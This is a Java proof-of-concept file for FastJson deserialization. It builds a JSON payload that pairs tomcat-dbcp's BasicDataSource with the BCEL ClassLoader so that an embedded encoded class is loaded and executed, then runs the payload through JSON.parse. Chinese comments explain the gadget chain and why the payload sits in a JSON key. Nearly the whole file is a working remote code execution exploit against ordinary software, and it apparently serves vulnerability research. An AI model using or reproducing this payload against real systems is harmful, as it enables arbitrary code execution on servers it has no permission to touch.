package basicdatasource;

/**
 * Created by xjj on 2023/3/18.
 */

import com.alibaba.fastjson.JSON;

/**
 * org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()
 *  javax.sql.DataSource#getConnection()
 *   org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory()
 *    java.lang.Class#forName(className, initialize, classLoader)
 *     com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass()
 *      com.sun.org.apache.bcel.internal.util.ClassLoader#createClass()
 *      java.lang.ClassLoader#defineClass()
 */
public class BasicDataSourcePoc {

    public static String basicDataSource() {
        // bcel + tomcat-dbcp
//         BasicDataSource
//         com.sun.org.apache.bcel.internal.util.ClassLoader
//        org.apache.tomcat.dbcp.dbcp2.BasicDataSource
        /**
         * https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
         * 这里PoC结构上还有一个值得注意的地方在于，
         * 先是将 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 “{}”。
         * 之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。
         *
         * 为什么这么设计呢？
         * 因为为了完成前面说的一整个利用链，我们需要触发 BasicDataSource.getConnection() 方法。
         * 我在 FastJson反序列化漏洞利用的三个细节 提到过，FastJson中的 JSON.parse() 会识别并调用目标类的 setter 方法以及某些满足特定条件的 getter 方法，然而 getConnection() 并不符合特定条件，所以正常来说在 FastJson 反序列化的过程中并不会被调用。
         * 原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 、is等方法。
         * 首先，在 {“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……} 这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。
         * 然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：
         */
        String bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5RMo$d3$40$Q$7d$9b8$b1cl$d2$a6$q$7cC$a0$F$d2J$d4$Xn$ad$wDU$q$84$a1$88T$e5$bc$de$ae$da$N$h$afeo$aa$f0$8b8$f7R$Q$H$7e$A$3f$K1$5e$daR$Jnx$e5$Z$cf$9byofG$fe$f1$f3$dbw$A$cf$f08D$80$eb$nn$e0f$80$5b$b5$bf$ed$e3N$88$W$ee$fa$b8$e7$e3$3eC$7bS$e5$can14G$ab$fb$M$de$b69$90$M$ddT$e5$f2$edl$9a$c9r$8fg$9a$90$5ej$E$d7$fb$bcTu$7c$Gz$f6HU$M$cfSa$a6$c9$7c2$d1$92$97$b9$ca$P$93$p$$$3e$s$T$7e$cc$93$8cWJ$qB$f3$aa$d2$86$l$c82$c9$3eY$v$a8K$95$ec$i$x$fdBH$bd$c1$Ql$K$7d6$I$p$e1$7e$ea$c8$ca$q$afvw$e6B$WV$99$9c$ca$e2$b1$r$e57$bcp$D$d0$5d$Y$c2$b1$99$95B$beT$f5$40$f1$b9$e4z$cd$8f$d0A$e8c$Y$e1$B$k2$ML$n$f3$e1S$3e$dc$e6Z$cc4$b7$a6$5c$e7E$Ra$Z$x$MK$ff$e8$Y$e1$RB$86$ad$ff$bb$k$c3$82$ab$d5$9c$a8$bb$d9D$K$cb$b0$f8$Hz$3f$cb$ad$9a$d2$f4$e1$a1$b4$XA$7f$b4$9a$feUC$x$f0$e4$5c$K$86$t$a3K$d9$b1$zi$ac$8d$cb$84w$a5$R$b2$aa$88$d0$z$ui$dd$e2$f6J$$$q$z$c3$a7$df$a2$7e$g$60$f5$8a$c8$5e$a1$u$n$cf$c8$b7$d6$be$80$9d$b8tD$b6$ed$c0$A1$d9$e8w$B$ae$a2$eb$b0$85$L2wb$40$ef$x$g$bd$e6$v$bc$P$9f$R$bc$5e$3bE$fb$c4$e1$j$e2$b6$d0t$8a$D$fa$C$b1$3a$a4$T$d1$89$e9$y$92$e2y$87$Y$k$c5$3d$8a$96$e8$f5$d1H$7d$5c$f3$u$d1wC$N$7e$B$b8$b1$V$bc$e0$C$A$A";
        String poc = "" +
                "{" +
                "    {" +
                "        \"a\": {" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"," +
                "                \"driverClassLoader\": {" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"" +
                "                }," +
                "                \"driverClassName\": \"" + bcel + "\"" +
                "        }" +
                "    }: \"b\"" +
                "}";
//        String poc = "" +
//                "{\n" +
//                "        \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
//                "        \"driverClassLoader\": {\n" +
//                "            \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
//                "        },\n" +
//                "        \"driverClassName\": \"" + bcel + "\"\n" +
//                "}";
        return poc;
    }

    public static void main(String[] args) {
        String poc = basicDataSource();
        /**
         * 这个里面有toJSON方法, 就是把已经构造好的类全部执行一遍其中的
         */
//        JSON.parseObject(poc);
        JSON.parse(poc);
    }
}
